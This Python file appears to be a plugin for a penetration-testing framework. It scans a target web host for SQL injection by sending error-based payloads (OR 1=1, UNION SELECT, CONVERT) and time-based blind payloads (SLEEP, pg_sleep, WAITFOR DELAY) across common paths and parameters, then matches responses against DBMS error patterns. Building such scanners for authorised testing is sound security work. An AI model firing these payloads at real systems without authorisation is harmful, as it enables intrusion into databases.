"""SQL injection detection via error-based and time-based fingerprinting.

Error patterns sourced from sqlmap, PayloadsAllTheThings, and OWASP.
"""

from __future__ import annotations

import time
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

# === Error patterns by DBMS (sourced from sqlmap + PayloadsAllTheThings) ===
SQL_ERROR_PATTERNS: dict[str, list[str]] = {
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql_",
        "com.mysql.jdbc",
        "mysqlclient",
        "mysql_fetch",
        "mysql_num_rows",
        "mysqld_safe",
        "sequel::mysql",
        "mysql_connect(",
        "mysql_result(",
        "supplied argument is not a valid mysql",
        "column count doesn't match",
        "the used select statements have a different",
        "data too long for column",
        "unknown column",
        "table.*doesn't exist",
        "access denied for user",
        "can't connect to local mysql",
    ],
    "PostgreSQL": [
        "pg_query",
        "pg_exec",
        "syntax error at or near",
        "org.postgresql",
        "psqlexception",
        "unterminated quoted string at or near",
        "invalid input syntax for",
        "pg_connect(",
        "pg_prepare(",
        "pg_execute(",
        "current transaction is aborted",
        "relation.*does not exist",
        "column.*does not exist",
        "permission denied for",
        "operator does not exist",
    ],
    "MSSQL": [
        "microsoft ole db provider for sql server",
        "unclosed quotation mark after the character string",
        "microsoft sql server",
        "sqlserver jdbc driver",
        "com.microsoft.sqlserver.jdbc",
        "sql server native client",
        "odbc sql server driver",
        "macromedia][sqlserver jdbc driver]",
        "incorrect syntax near",
        "invalid column name",
        "invalid object name",
        "conversion failed when converting",
        "arithmetic overflow error",
        "string or binary data would be truncated",
        "cannot insert the value null",
    ],
    "Oracle": [
        "ora-01756",
        "ora-00933",
        "ora-06512",
        "ora-01722",
        "ora-00904",
        "oracle error",
        "oracle.*driver",
        "quoted string not properly terminated",
        "sql command not properly ended",
        "ora-00942",
        "ora-06550",
        "ora-01843",
        "ora-00936",
        "ora-12154",
        "pls-00306",
    ],
    "SQLite": [
        "sqlite3.operationalerror",
        "sqlite_error",
        "unrecognized token",
        "near \"*\": syntax error",
        "unable to open database",
        "sqlite.exception",
        "no such table",
        "no such column",
        "database is locked",
        "misuse of aggregate",
    ],
    "IBM DB2": [
        "db2 sql error",
        "com.ibm.db2",
        "sqlcode=-",
        "sqlstate=",
        "db2_connect(",
        "db2_exec(",
        "cli driver",
        "db2 for",
        "db2 udb",
    ],
    "Firebird": [
        "dynamic sql error",
        "isc_dsql_",
        "firebird.*error",
        "gds_to_sqlcode",
        "arithmetic exception",
    ],
    "SAP HANA": [
        "sap.*hana.*error",
        "hdbsql",
        "hdb error",
        "sap hana database",
        "invalid table name",
    ],
    "Sybase": [
        "sybase.*error",
        "com.sybase.jdbc",
        "sybsystemprocs",
        "adaptive server enterprise",
        "incorrect syntax near",
    ],
    "Generic": [
        "sqlstate",
        "sql syntax",
        "sql error",
        "odbc error",
        "jdbc error",
        "dynamic sql error",
        "unterminated string",
        "unexpected end of sql",
        "division by zero",
        "supplied argument is not a valid",
        "you have an error in your sql",
        "warning: pg_",
        "valid mysql result",
        "mysql server version for the right syntax",
        "sqlite_master",
    ],
}

# Flatten for quick matching
ALL_ERROR_PATTERNS: list[tuple[str, str]] = []
for dbms, patterns in SQL_ERROR_PATTERNS.items():
    for p in patterns:
        ALL_ERROR_PATTERNS.append((dbms, p))

# === Payloads ===
# Error-based
ERROR_PAYLOADS = [
    "'",
    "\"",
    "1'",
    "1\"",
    "1' OR '1'='1",
    "1' OR '1'='1'--",
    "1' OR '1'='1'/*",
    "1; SELECT 1--",
    "' UNION SELECT NULL--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "') OR ('1'='1",
    "1' WAITFOR DELAY '0:0:0'--",
    "1) OR 1=1--",
    "admin'--",
]

# Time-based blind
TIME_PAYLOADS = [
    ("' OR SLEEP(5)-- -", 5),
    ("' OR pg_sleep(5)-- -", 5),
    ("'; WAITFOR DELAY '0:0:5'-- -", 5),
    ("' OR BENCHMARK(5000000,SHA1('test'))-- -", 5),
    ("1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END--", 5),
]

# Common injectable parameters
SQLI_PARAMS = [
    "id", "page", "q", "search", "cat", "category", "item",
    "product", "user", "uid", "name", "view", "article",
    "type", "sort", "order", "filter", "year", "num", "p",
]

# Pages to test
SQLI_PATHS = [
    "/", "/search", "/products", "/news", "/article",
    "/page", "/index.php", "/catalog",
]

TIME_THRESHOLD = 4.0


class SqliBasicPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="sqli_basic",
        display_name="SQL Injection Scanner",
        category=PluginCategory.PENTESTING,
        description="Detects error-based and time-based SQL injection",
        produces=["sqli_findings"],
        timeout=45.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host,
                error="HTTP client not available",
            )

        findings: list[Finding] = []
        tested: list[dict] = []
        base_url = ""

        for scheme in ("https", "http"):
            try:
                async with ctx.rate:
                    await ctx.http.get(
                        f"{scheme}://{target.host}/", timeout=5.0,
                    )
                    base_url = f"{scheme}://{target.host}"
                    break
            except Exception:
                continue

        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"sqli_tests": []},
            )

        # SPA baseline
        spa_baseline = ""
        try:
            async with ctx.rate:
                r = await ctx.http.get(
                    f"{base_url}/_nonexistent_8x7z_sqli/", timeout=5.0,
                )
                if r.status == 200:
                    spa_baseline = await r.text(
                        encoding="utf-8", errors="replace",
                    )
        except Exception:
            pass

        # Phase 1: Error-based detection
        for path in SQLI_PATHS:
            for param in SQLI_PARAMS:
                for payload in ERROR_PAYLOADS:
                    url = (
                        f"{base_url}{path}"
                        f"?{param}={quote(payload)}"
                    )
                    try:
                        async with ctx.rate:
                            resp = await ctx.http.get(url, timeout=8.0)
                            body = (await resp.text(
                                encoding="utf-8", errors="replace",
                            )).lower()

                            # Skip SPA catch-all
                            if (
                                spa_baseline
                                and abs(len(body) - len(spa_baseline)) < 100
                            ):
                                break  # skip this param

                            for dbms, pattern in ALL_ERROR_PATTERNS:
                                if pattern in body:
                                    tested.append({
                                        "url": url,
                                        "payload": payload,
                                        "dbms": dbms,
                                        "pattern": pattern,
                                    })
                                    findings.append(Finding.critical(
                                        f"SQL injection ({dbms}): "
                                        f"{path}?{param}=",
                                        description=(
                                            f"SQL error from {dbms} with "
                                            f"payload: {payload}"
                                        ),
                                        evidence=f"Pattern: {pattern}",
                                        remediation=(
                                            "Use parameterized queries / "
                                            "prepared statements"
                                        ),
                                        tags=["pentesting", "sqli", dbms],
                                    ))
                                    break
                    except Exception:
                        continue

                    if findings:
                        break
                if findings:
                    break
            if findings:
                break

        # Phase 2: Time-based blind (only if no error-based found)
        if not findings:
            for param in SQLI_PARAMS[:5]:
                baseline_url = f"{base_url}/?{param}=1"
                baseline_time = await self._measure(ctx, baseline_url)
                if baseline_time is None:
                    continue

                for payload, _delay in TIME_PAYLOADS:
                    url = f"{base_url}/?{param}={quote(payload)}"
                    try:
                        async with ctx.rate:
                            start = time.monotonic()
                            await ctx.http.get(url, timeout=15.0)
                            elapsed = time.monotonic() - start

                            delta = elapsed - baseline_time
                            if delta >= TIME_THRESHOLD:
                                tested.append({
                                    "param": param,
                                    "payload": payload,
                                    "type": "time-based",
                                    "baseline": round(baseline_time, 2),
                                    "elapsed": round(elapsed, 2),
                                })
                                findings.append(Finding.high(
                                    "Time-based blind SQLi: "
                                    f"/?{param}=",
                                    description=(
                                        f"Response delayed {delta:.1f}s "
                                        f"with payload: {payload}"
                                    ),
                                    evidence=(
                                        f"Baseline: {baseline_time:.2f}s, "
                                        f"Payload: {elapsed:.2f}s"
                                    ),
                                    remediation=(
                                        "Use parameterized queries / "
                                        "prepared statements"
                                    ),
                                    tags=["pentesting", "sqli", "blind"],
                                ))
                                break
                    except Exception:
                        continue
                if findings:
                    break

        if not findings:
            findings.append(Finding.info(
                "No SQL injection detected",
                tags=["pentesting", "sqli"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"sqli_tests": tested},
        )

    async def _measure(self, ctx, url: str) -> float | None:
        try:
            async with ctx.rate:
                start = time.monotonic()
                await ctx.http.get(url, timeout=8.0)
                return time.monotonic() - start
        except Exception:
            return None
